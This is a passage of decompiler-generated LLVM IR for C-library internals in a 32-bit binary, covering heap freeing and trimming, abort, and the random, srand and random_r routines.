  br i1 %v1_8060578, label %dec_label_pc_80605b1, label %dec_label_pc_806057a

dec_label_pc_806057a:                             ; preds = %dec_label_pc_8060575
  %v2_806057a = add i32 %v3_8060561, %v1_8060519
  store i32 %v2_806057a, i32* @ebx, align 4
  store i32 %v3_806056b, i32* %v2_806056e, align 4
  %v0_806057f = load i32, i32* @edi, align 4
  %v1_806057f = load i32, i32* %edx.global-to-local, align 4
  %v2_806057f = add i32 %v1_806057f, 8
  %v3_806057f = inttoptr i32 %v2_806057f to i32*
  store i32 %v0_806057f, i32* %v3_806057f, align 4
  %v0_8060589.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8060582

dec_label_pc_8060582:                             ; preds = %dec_label_pc_8060549, %dec_label_pc_806057a
  %v1_8060595 = phi i32 [ %v2_8060551, %dec_label_pc_8060549 ], [ %v0_8060589.pre, %dec_label_pc_806057a ]
  %v1_8060586 = and i32 %v3_8060554, -4
  store i32 %v1_8060586, i32* @ebp, align 4
  %v1_8060589 = load i32, i32* @global_var_807f14c.730, align 4
  %v12_8060589 = icmp eq i32 %v1_8060595, %v1_8060589
  br i1 %v12_8060589, label %dec_label_pc_80605e3, label %dec_label_pc_8060591

dec_label_pc_8060591:                             ; preds = %dec_label_pc_8060582
  %v2_8060591 = add i32 %v1_8060595, 4
  %v3_8060591 = add i32 %v2_8060591, %v1_8060586
  %v4_8060591 = inttoptr i32 %v3_8060591 to i32*
  %v5_8060591 = load i32, i32* %v4_8060591, align 4
  store i32 %v5_8060591, i32* %eax.global-to-local, align 4
  %v3_8060595 = inttoptr i32 %v2_8060591 to i32*
  store i32 %v1_8060586, i32* %v3_8060595, align 4
  %v0_8060598 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060598 = urem i32 %v0_8060598, 2
  %v2_8060598 = icmp eq i32 %v1_8060598, 0
  store i32 %v1_8060598, i32* %eax.global-to-local, align 4
  %v1_806059d = icmp eq i1 %v2_8060598, false
  br i1 %v1_806059d, label %dec_label_pc_80605be, label %dec_label_pc_806059f

dec_label_pc_806059f:                             ; preds = %dec_label_pc_8060591
  %v0_806059f = load i32, i32* @esi, align 4
  %v1_806059f = add i32 %v0_806059f, 8
  %v2_806059f = inttoptr i32 %v1_806059f to i32*
  %v3_806059f = load i32, i32* %v2_806059f, align 4
  store i32 %v3_806059f, i32* @edx, align 4
  %v1_80605a2 = add i32 %v0_806059f, 12
  %v2_80605a2 = inttoptr i32 %v1_80605a2 to i32*
  %v3_80605a2 = load i32, i32* %v2_80605a2, align 4
  store i32 %v3_80605a2, i32* %eax.global-to-local, align 4
  %v1_80605a5 = add i32 %v3_806059f, 12
  %v2_80605a5 = inttoptr i32 %v1_80605a5 to i32*
  %v3_80605a5 = load i32, i32* %v2_80605a5, align 4
  store i32 %v3_80605a5, i32* @edi, align 4
  %v12_80605a8 = icmp eq i32 %v3_80605a5, %v0_806059f
  %v1_80605aa = icmp eq i1 %v12_80605a8, false
  br i1 %v1_80605aa, label %dec_label_pc_80605b1, label %dec_label_pc_80605ac

dec_label_pc_80605ac:                             ; preds = %dec_label_pc_806059f
  %v1_80605ac = add i32 %v3_80605a2, 8
  %v2_80605ac = inttoptr i32 %v1_80605ac to i32*
  %v3_80605ac = load i32, i32* %v2_80605ac, align 4
  %v15_80605ac = icmp eq i32 %v3_80605ac, %v3_80605a5
  br i1 %v15_80605ac, label %dec_label_pc_80605b6, label %dec_label_pc_80605b1

dec_label_pc_80605b1:                             ; preds = %dec_label_pc_80605ac, %dec_label_pc_806059f, %dec_label_pc_8060575, %dec_label_pc_8060561
  %v0_80605b1 = call i32 @abort()
  store i32 %v0_80605b1, i32* %eax.global-to-local, align 4
  %v1_80605b6.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80605b6

dec_label_pc_80605b6:                             ; preds = %dec_label_pc_80605ac, %dec_label_pc_80605b1
  %v1_80605b6 = phi i32 [ %v3_806059f, %dec_label_pc_80605ac ], [ %v1_80605b6.pre, %dec_label_pc_80605b1 ]
  %v0_80605b6 = phi i32 [ %v3_80605a2, %dec_label_pc_80605ac ], [ %v0_80605b1, %dec_label_pc_80605b1 ]
  %v2_80605b6 = add i32 %v1_80605b6, 12
  %v3_80605b6 = inttoptr i32 %v2_80605b6 to i32*
  store i32 %v0_80605b6, i32* %v3_80605b6, align 4
  %v0_80605b9 = load i32, i32* @ebx, align 4
  %v1_80605b9 = load i32, i32* @ebp, align 4
  %v2_80605b9 = add i32 %v1_80605b9, %v0_80605b9
  store i32 %v2_80605b9, i32* @ebx, align 4
  %v0_80605bb = load i32, i32* @edx, align 4
  %v1_80605bb = load i32, i32* %eax.global-to-local, align 4
  %v2_80605bb = add i32 %v1_80605bb, 8
  %v3_80605bb = inttoptr i32 %v2_80605bb to i32*
  store i32 %v0_80605bb, i32* %v3_80605bb, align 4
  br label %dec_label_pc_80605be

dec_label_pc_80605be:                             ; preds = %dec_label_pc_8060591, %dec_label_pc_80605b6
  %v0_80605be = load i32, i32* @global_var_807f15c.748, align 4
  store i32 %v0_80605be, i32* %eax.global-to-local, align 4
  %v0_80605c3 = load i32, i32* @ecx, align 4
  %v1_80605c3 = add i32 %v0_80605c3, 12
  %v2_80605c3 = inttoptr i32 %v1_80605c3 to i32*
  store i32 ptrtoint (i32* @global_var_807f154.732 to i32), i32* %v2_80605c3, align 4
  %v0_80605ca = load i32, i32* @ebx, align 4
  %v1_80605ca = load i32, i32* @ecx, align 4
  %v3_80605ca = add i32 %v1_80605ca, %v0_80605ca
  %v4_80605ca = inttoptr i32 %v3_80605ca to i32*
  store i32 %v0_80605ca, i32* %v4_80605ca, align 4
  %v0_80605cd = load i32, i32* %eax.global-to-local, align 4
  %v1_80605cd = load i32, i32* @ecx, align 4
  %v2_80605cd = add i32 %v1_80605cd, 8
  %v3_80605cd = inttoptr i32 %v2_80605cd to i32*
  store i32 %v0_80605cd, i32* %v3_80605cd, align 4
  %v0_80605d0 = load i32, i32* @ecx, align 4
  %v1_80605d0 = load i32, i32* %eax.global-to-local, align 4
  %v2_80605d0 = add i32 %v1_80605d0, 12
  %v3_80605d0 = inttoptr i32 %v2_80605d0 to i32*
  store i32 %v0_80605d0, i32* %v3_80605d0, align 4
  %v0_80605d3 = load i32, i32* @ebx, align 4
  %v1_80605d5 = or i32 %v0_80605d3, 1
  store i32 %v1_80605d5, i32* %eax.global-to-local, align 4
  %v0_80605d8 = load i32, i32* @ecx, align 4
  store i32 %v0_80605d8, i32* @global_var_807f15c.748, align 4
  %v2_80605de = add i32 %v0_80605d8, 4
  %v3_80605de = inttoptr i32 %v2_80605de to i32*
  store i32 %v1_80605d5, i32* %v3_80605de, align 4
  br label %dec_label_pc_80605f3

dec_label_pc_80605e3:                             ; preds = %dec_label_pc_8060582
  %v0_80605e3 = load i32, i32* @ebx, align 4
  %v2_80605e3 = add i32 %v0_80605e3, %v1_8060586
  store i32 %v2_80605e3, i32* @ebx, align 4
  %v1_80605e7 = or i32 %v2_80605e3, 1
  store i32 %v1_80605e7, i32* %eax.global-to-local, align 4
  %v1_80605ea = load i32, i32* @ecx, align 4
  %v2_80605ea = add i32 %v1_80605ea, 4
  %v3_80605ea = inttoptr i32 %v2_80605ea to i32*
  store i32 %v1_80605e7, i32* %v3_80605ea, align 4
  %v0_80605ed = load i32, i32* @ecx, align 4
  store i32 %v0_80605ed, i32* @global_var_807f14c.730, align 4
  br label %dec_label_pc_80605f3

dec_label_pc_80605f3:                             ; preds = %dec_label_pc_80605be, %dec_label_pc_80605e3
  %v0_80605f3 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_80605f3, 131072
  br i1 %tmp, label %dec_label_pc_8060658, label %dec_label_pc_80605fb

dec_label_pc_80605fb:                             ; preds = %dec_label_pc_80605f3
  %v0_80605fb = load i8, i8* @global_var_807f120.729, align 32
  %v1_80605fb = and i8 %v0_80605fb, 2
  %v2_80605fb = icmp eq i8 %v1_80605fb, 0
  br i1 %v2_80605fb, label %dec_label_pc_8060614, label %dec_label_pc_8060604

dec_label_pc_8060604:                             ; preds = %dec_label_pc_80605fb
  %v2_806060c = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807f120.729 to i32*))
  store i32 %v2_806060c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060614

dec_label_pc_8060614:                             ; preds = %dec_label_pc_80605fb, %dec_label_pc_8060604
  %v0_8060614 = load i32, i32* @global_var_807f14c.730, align 4
  store i32 %v0_8060614, i32* %eax.global-to-local, align 4
  %v1_8060619 = add i32 %v0_8060614, 4
  %v2_8060619 = inttoptr i32 %v1_8060619 to i32*
  %v3_8060619 = load i32, i32* %v2_8060619, align 4
  %v1_806061c = and i32 %v3_8060619, -4
  store i32 %v1_806061c, i32* %eax.global-to-local, align 4
  %v1_806061f = load i32, i32* @global_var_807f464.746, align 4
  %v7_806061f = icmp ult i32 %v1_806061c, %v1_806061f
  br i1 %v7_806061f, label %dec_label_pc_8060658, label %dec_label_pc_8060627

dec_label_pc_8060627:                             ; preds = %dec_label_pc_8060614
  %v0_8060627 = load i32, i32* @global_var_807f468.744, align 8
  store i32 %v0_8060627, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_807f120.729 to i32), i32* @edx, align 4
  %v0_8060631 = call i32 @__malloc_trim()
  store i32 %v0_8060631, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060658

dec_label_pc_8060638:                             ; preds = %dec_label_pc_8060540
  %v2_8060638 = inttoptr i32 %v1_8060509 to i32*
  %v3_8060638 = load i32, i32* %v2_8060638, align 4
  store i32 %v3_8060638, i32* %edx.global-to-local, align 4
  %v0_806063b = load i32, i32* @global_var_807f470.737, align 16
  %v1_806063b = add i32 %v0_806063b, -1
  store i32 %v1_806063b, i32* @global_var_807f470.737, align 16
  %v2_8060641 = add i32 %v3_8060638, %v1_8060519
  store i32 %v2_8060641, i32* %eax.global-to-local, align 4
  %v2_8060644 = sub i32 %v1_8060509, %v3_8060638
  %v0_806064a = load i32, i32* @global_var_807f484.741, align 4
  %v2_806064a = sub i32 %v0_806064a, %v2_8060641
  store i32 %v2_806064a, i32* @global_var_807f484.741, align 4
  %v4_8060650 = call i32 @munmap(i32 %v2_8060644, i32 %v2_8060641, i32 %v1_8060519, i32 %v1_8060519)
  store i32 %v4_8060650, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060658

dec_label_pc_8060658:                             ; preds = %dec_label_pc_8060614, %dec_label_pc_80605f3, %dec_label_pc_8060627, %dec_label_pc_8060520, %dec_label_pc_8060638
  store i32 %v2_80604f3, i32* %eax.global-to-local, align 4
  %v3_8060661 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_8060661, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060669

dec_label_pc_8060669:                             ; preds = %entry, %dec_label_pc_8060658
  %.0 = phi i32 [ undef, %entry ], [ %v3_8060661, %dec_label_pc_8060658 ]
  store i32 %v0_80604d8, i32* @ebx, align 4
  store i32 %v0_80604d7, i32* @esi, align 4
  store i32 %v0_80604d6, i32* @edi, align 4
  store i32 %v0_80604d5, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8060638, { 1, 0, 2 }
  uselistorder i32 %v0_80605ca, { 1, 0 }
  uselistorder i32 %v1_8060598, { 1, 0 }
  uselistorder i32 %v2_8060591, { 1, 0 }
  uselistorder i32 %v1_8060586, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8060595, { 1, 0 }
  uselistorder i32 %v2_8060523, { 1, 0 }
  uselistorder i32 %v1_8060519, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8060511, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8060509, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 21, 22, 23, 24, 25, 26, 19, 20 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 2, 0, 1, 3 }
  uselistorder i32* bitcast (i8* @global_var_807f120.729 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_807f154.732 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_807f14c.730, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 ptrtoint (i8* @global_var_807f120.729 to i32), { 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_807f120.729, { 4, 7, 6, 5, 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8074eb0.646 to i32), { 3, 0, 4, 1, 5, 9, 2, 6, 7, 8 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_8060669, { 1, 0 }
  uselistorder label %dec_label_pc_8060658, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8060614, { 1, 0 }
  uselistorder label %dec_label_pc_80605f3, { 1, 0 }
  uselistorder label %dec_label_pc_80605be, { 1, 0 }
  uselistorder label %dec_label_pc_80605b6, { 1, 0 }
  uselistorder label %dec_label_pc_8060582, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_80606a0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074ec8.749 to i32))
  %v12_80606aa = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80606af

dec_label_pc_80606af:                             ; preds = %dec_label_pc_80606af.dec_label_pc_80606af_crit_edge, %entry
  %v0_80606af = phi i32 [ %v12_80606aa, %entry ], [ %v0_80606af.pre, %dec_label_pc_80606af.dec_label_pc_80606af_crit_edge ]
  %v1_80606ba23 = phi i32 [ 31, %entry ], [ %v1_80606ba, %dec_label_pc_80606af.dec_label_pc_80606af_crit_edge ]
  %v2_80606af = mul i32 %v1_80606ba23, 4
  %v3_80606af = add i32 %v2_80606af, 152
  %v4_80606af = add i32 %v3_80606af, %v0_80606af
  %v5_80606af = inttoptr i32 %v4_80606af to i32*
  store i32 0, i32* %v5_80606af, align 4
  %v0_80606ba.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80606ba = add i32 %v0_80606ba.pre, -1
  %v9_80606ba = icmp slt i32 %v1_80606ba, 0
  store i32 %v1_80606ba, i32* %eax.global-to-local, align 4
  %v1_80606bb = icmp eq i1 %v9_80606ba, false
  br i1 %v1_80606bb, label %dec_label_pc_80606af.dec_label_pc_80606af_crit_edge, label %dec_label_pc_80606bd

dec_label_pc_80606af.dec_label_pc_80606af_crit_edge: ; preds = %dec_label_pc_80606af
  %v0_80606af.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80606af

dec_label_pc_80606bd:                             ; preds = %dec_label_pc_80606af
  %v0_80606bd = load i32, i32* @ebx, align 4
  %v2_80606c1 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80606c1, i32* @ebx, align 4
  %v4_80606c9 = call i32 @__sigaddset(i32 %v2_80606c1, i32 6, i32 %v0_80606bd, i32 %v0_80606bd)
  store i32 %v4_80606c9, i32* %eax.global-to-local, align 4
  %v1_80606d1 = icmp eq i32 %v4_80606c9, 0
  %v1_80606d3 = icmp eq i1 %v1_80606d1, false
  br i1 %v1_80606d3, label %dec_label_pc_80606e3, label %dec_label_pc_80606d5

dec_label_pc_80606d5:                             ; preds = %dec_label_pc_80606bd
  %v3_80606db = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_80606db = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_80606db, i32 0)
  store i32 %v4_80606db, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80606e3

dec_label_pc_80606e3:                             ; preds = %dec_label_pc_80606bd, %dec_label_pc_80606d5
  %v2_806071b4 = phi i32 [ %v4_80606c9, %dec_label_pc_80606bd ], [ %v4_80606db, %dec_label_pc_80606d5 ]
  %v0_80606e3 = load i8, i8* @global_var_807d8a0.750, align 32
  %v1_80606e3 = icmp eq i8 %v0_80606e3, 0
  %v1_80606ea = icmp eq i1 %v1_80606e3, false
  br i1 %v1_80606ea, label %dec_label_pc_806071b, label %dec_label_pc_80606ec

dec_label_pc_80606ec:                             ; preds = %dec_label_pc_80606e3
  store i8 1, i8* @global_var_807d8a0.750, align 32
  br label %dec_label_pc_80606f3

dec_label_pc_80606f3:                             ; preds = %dec_label_pc_806075a, %dec_label_pc_80606ec
  %v1_80606fb = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8074ec8.749 to i32))
  store i32 %v1_80606fb, i32* %eax.global-to-local, align 4
  %v1_8060707 = call i32 @__GI_raise(i32 6)
  store i32 %v1_8060707, i32* %eax.global-to-local, align 4
  %v1_8060713 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074ec8.749 to i32))
  store i32 %v1_8060713, i32* %eax.global-to-local, align 4
  %v0_806071b.pre = load i8, i8* @global_var_807d8a0.750, align 32
  br label %dec_label_pc_806071b

dec_label_pc_806071b:                             ; preds = %dec_label_pc_80606e3, %dec_label_pc_80606f3
  %v2_806071b = phi i32 [ %v2_806071b4, %dec_label_pc_80606e3 ], [ %v1_8060713, %dec_label_pc_80606f3 ]
  %v0_806071b = phi i8 [ %v0_80606e3, %dec_label_pc_80606e3 ], [ %v0_806071b.pre, %dec_label_pc_80606f3 ]
  %v1_806071b = zext i8 %v0_806071b to i32
  %v3_806071b = and i32 %v2_806071b, -256
  %v4_806071b = or i32 %v1_806071b, %v3_806071b
  store i32 %v4_806071b, i32* %eax.global-to-local, align 4
  %v10_8060720 = icmp eq i8 %v0_806071b, 1
  %v1_8060722 = icmp eq i1 %v10_8060720, false
  br i1 %v1_8060722, label %dec_label_pc_806077c, label %dec_label_pc_8060724

dec_label_pc_8060724:                             ; preds = %dec_label_pc_806071b
  %v2_806072c = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_806072c, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_807d8a0.750, align 32
  %v3_8060738 = bitcast i32* %stack_var_-272 to i8*
  %v4_8060738 = call i32 @__GI_memset(i8* %v3_8060738, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806074f

dec_label_pc_806074f:                             ; preds = %dec_label_pc_806074f.dec_label_pc_806074f_crit_edge, %dec_label_pc_8060724
  %v0_806074f = phi i32 [ %v12_80606aa, %dec_label_pc_8060724 ], [ %v0_806074f.pre, %dec_label_pc_806074f.dec_label_pc_806074f_crit_edge ]
  %v1_806075722 = phi i32 [ 31, %dec_label_pc_8060724 ], [ %v1_8060757, %dec_label_pc_806074f.dec_label_pc_806074f_crit_edge ]
  %v2_806074f = mul i32 %v1_806075722, 4
  %v3_806074f = add i32 %v2_806074f, 16
  %v4_806074f = add i32 %v3_806074f, %v0_806074f
  %v5_806074f = inttoptr i32 %v4_806074f to i32*
  store i32 -1, i32* %v5_806074f, align 4
  %v0_8060757.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8060757 = add i32 %v0_8060757.pre, -1
  %v9_8060757 = icmp slt i32 %v1_8060757, 0
  store i32 %v1_8060757, i32* %eax.global-to-local, align 4
  %v1_8060758 = icmp eq i1 %v9_8060757, false
  br i1 %v1_8060758, label %dec_label_pc_806074f.dec_label_pc_806074f_crit_edge, label %dec_label_pc_806075a

dec_label_pc_806074f.dec_label_pc_806074f_crit_edge: ; preds = %dec_label_pc_806074f
  %v0_806074f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_806074f

dec_label_pc_806075a:                             ; preds = %dec_label_pc_806074f
  store i32 %v2_806072c, i32* %eax.global-to-local, align 4
  %v4_806076f = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_806076f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80606f3

dec_label_pc_806077c:                             ; preds = %dec_label_pc_806071b
  %v10_806077c = icmp eq i8 %v0_806071b, 2
  %v1_806077e = icmp eq i1 %v10_806077c, false
  br i1 %v1_806077e, label %dec_label_pc_8060788, label %dec_label_pc_8060788.thread

dec_label_pc_8060788.thread:                      ; preds = %dec_label_pc_806077c
  store i8 3, i8* @global_var_807d8a0.750, align 32
  br label %dec_label_pc_8060791

dec_label_pc_8060788:                             ; preds = %dec_label_pc_806077c
  %v9_8060788 = icmp eq i8 %v0_806071b, 3
  %v1_806078f = icmp eq i1 %v9_8060788, false
  br i1 %v1_806078f, label %dec_label_pc_80607a2, label %dec_label_pc_8060791

dec_label_pc_8060791:                             ; preds = %dec_label_pc_8060788.thread, %dec_label_pc_8060788
  store i8 4, i8* @global_var_807d8a0.750, align 32
  %v1_806079d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_80607a2:                             ; preds = %dec_label_pc_8060788, %dec_label_pc_80607a2
  br label %dec_label_pc_80607a2

; uselistorder directives
  uselistorder i32 %v1_8060757, { 2, 1, 0 }
  uselistorder i32 %v1_80606ba, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 13, 14, 9, 10, 12, 11, 1 }
  uselistorder i32 140, { 0, 2, 1 }
  uselistorder i32 (i32)* @pthread_mutex_unlock, { 0, 3, 2, 6, 1, 5, 4 }
  uselistorder i8* @global_var_807d8a0.750, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80607a2, { 1, 0 }
  uselistorder label %dec_label_pc_8060791, { 1, 0 }
  uselistorder label %dec_label_pc_806071b, { 1, 0 }
  uselistorder label %dec_label_pc_80606e3, { 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80607b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80607b0, i32* %stack_var_-4, align 4
  %v2_80607be = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80607be, i32* @ebx, align 4
  %v4_80607c3 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134586897, i32 ptrtoint (i32* @global_var_8074ee0.751 to i32))
  %v1_80607cf = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074ee0.751 to i32))
  store i32 ptrtoint (i32* @global_var_8074ee0.751 to i32), i32* @ecx, align 4
  %v2_80607d6 = ptrtoint i32* %stack_var_-8 to i32
  %v3_80607e0 = call i32 @__GI_random_r(i32* nonnull @global_var_8074ef8, i32 %v2_80607d6)
  %v3_80607ea = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v3_80607ef = load i32, i32* %stack_var_-8, align 4
  %v2_80607f6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80607f6, i32* @ebx, align 4
  ret i32 %v3_80607ef
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80608ac = load i32, i32* @ebx, align 4
  store i32 %v0_80608ac, i32* %stack_var_-4, align 4
  %v2_80608ba = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80608ba, i32* @ebx, align 4
  %v4_80608bf = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134586897, i32 ptrtoint (i32* @global_var_8074ee0.751 to i32))
  %v1_80608cb = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074ee0.751 to i32))
  %v3_80608db = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_8074ef8)
  store i32 %arg1, i32* @ecx, align 4
  %v3_80608e5 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v2_80608ed = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80608ed, i32* @ebx, align 4
  ret i32 %v3_80608e5

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8074ee0.751 to i32), { 3, 1, 0, 4, 2 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_806098c = load i32, i32* @ebx, align 4
  store i32 %v0_806098c, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8060995 = add i32 %tmp3, 12
  %v2_8060995 = inttoptr i32 %v1_8060995 to i32*
  %v3_8060995 = load i32, i32* %v2_8060995, align 4
  %v4_8060995 = icmp eq i32 %v3_8060995, 0
  %v1_8060999 = add i32 %tmp3, 8
  %v2_8060999 = inttoptr i32 %v1_8060999 to i32*
  %v3_8060999 = load i32, i32* %v2_8060999, align 4
  store i32 %v3_8060999, i32* %esi.global-to-local, align 4
  %v1_806099c = icmp eq i1 %v4_8060995, false
  br i1 %v1_806099c, label %dec_label_pc_80609b5, label %dec_label_pc_806099e

dec_label_pc_806099e:                             ; preds = %entry
  %v2_806099e = inttoptr i32 %v3_8060999 to i32*
  %v3_806099e = load i32, i32* %v2_806099e, align 4
  %v5_806099e = mul i32 %v3_806099e, 1103515245
  %v1_80609a4 = add i32 %v5_806099e, 12345
  %v1_80609a9 = urem i32 %v1_80609a4, -2147483648
  store i32 %v1_80609a9, i32* %eax.global-to-local, align 4
  store i32 %v1_80609a9, i32* %v2_806099e, align 4
  %v0_80609b0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80609b0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80609b0 = inttoptr i32 %v1_80609b0 to i32*
  store i32 %v0_80609b0, i32* %v2_80609b0, align 4
  br label %dec_label_pc_80609e0

dec_label_pc_80609b5:                             ; preds = %entry
  %v1_80609b5 = add i32 %tmp3, 4
  %v2_80609b5 = inttoptr i32 %v1_80609b5 to i32*
  %v3_80609b5 = load i32, i32* %v2_80609b5, align 4
  store i32 %v3_80609b5, i32* @ecx, align 4
  %v2_80609b8 = load i32, i32* %arg1, align 4
  store i32 %v2_80609b8, i32* %edx.global-to-local, align 4
  %v1_80609ba = add i32 %tmp3, 24
  %v2_80609ba = inttoptr i32 %v1_80609ba to i32*
  %v3_80609ba = load i32, i32* %v2_80609ba, align 4
  store i32 %v3_80609ba, i32* %edi.global-to-local, align 4
  %v1_80609bd = inttoptr i32 %v3_80609b5 to i32*
  %v2_80609bd = load i32, i32* %v1_80609bd, align 4
  store i32 %v2_80609bd, i32* %eax.global-to-local, align 4
  %v1_80609bf = inttoptr i32 %v2_80609b8 to i32*
  %v2_80609bf = load i32, i32* %v1_80609bf, align 4
  %v4_80609bf = add i32 %v2_80609bf, %v2_80609bd
  store i32 %v4_80609bf, i32* %v1_80609bf, align 4
  %v0_80609c1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80609c1 = inttoptr i32 %v0_80609c1 to i32*
  %v2_80609c1 = load i32, i32* %v1_80609c1, align 4
  %v1_80609c3 = add i32 %v0_80609c1, 4
  store i32 %v1_80609c3, i32* %edx.global-to-local, align 4
  %v2_80609c6 = udiv i32 %v2_80609c1, 2
  %v1_80609c8 = load i32, i32* %edi.global-to-local, align 4
  %v7_80609c8 = icmp ult i32 %v1_80609c3, %v1_80609c8
  %v1_80609ca = load i32, i32* %ebp.global-to-local, align 4
  %v2_80609ca = inttoptr i32 %v1_80609ca to i32*
  store i32 %v2_80609c6, i32* %v2_80609ca, align 4
  %v0_80609cd = load i32, i32* @ecx, align 4
  %v1_80609cd = add i32 %v0_80609cd, 4
  store i32 %v1_80609cd, i32* %eax.global-to-local, align 4
  br i1 %v7_80609c8, label %dec_label_pc_80609d6, label %dec_label_pc_80609d2

dec_label_pc_80609d2:                             ; preds = %dec_label_pc_80609b5
  %v0_80609d2 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80609d2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80609db

dec_label_pc_80609d6:                             ; preds = %dec_label_pc_80609b5
  %v1_80609d6 = load i32, i32* %edi.global-to-local, align 4
  %v7_80609d6 = icmp ult i32 %v1_80609cd, %v1_80609d6
  %v1_80609d8 = icmp eq i1 %v7_80609d6, false
  %v3_80609d8 = load i32, i32* %esi.global-to-local, align 4
  %v4_80609d8 = select i1 %v1_80609d8, i32 %v3_80609d8, i32 %v1_80609cd
  store i32 %v4_80609d8, i32* %eax.global-to-local, align 4
  %v0_80609db.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80609db

dec_label_pc_80609db:                             ; preds = %dec_label_pc_80609d2, %dec_label_pc_80609d6
  %v0_80609db = phi i32 [ %v0_80609d2, %dec_label_pc_80609d2 ], [ %v0_80609db.pre, %dec_label_pc_80609d6 ]
  %v1_80609db = load i32, i32* %ebx.global-to-local, align 4
  %v2_80609db = inttoptr i32 %v1_80609db to i32*
  store i32 %v0_80609db, i32* %v2_80609db, align 4
  %v0_80609dd = load i32, i32* %eax.global-to-local, align 4
  %v1_80609dd = load i32, i32* %ebx.global-to-local, align 4
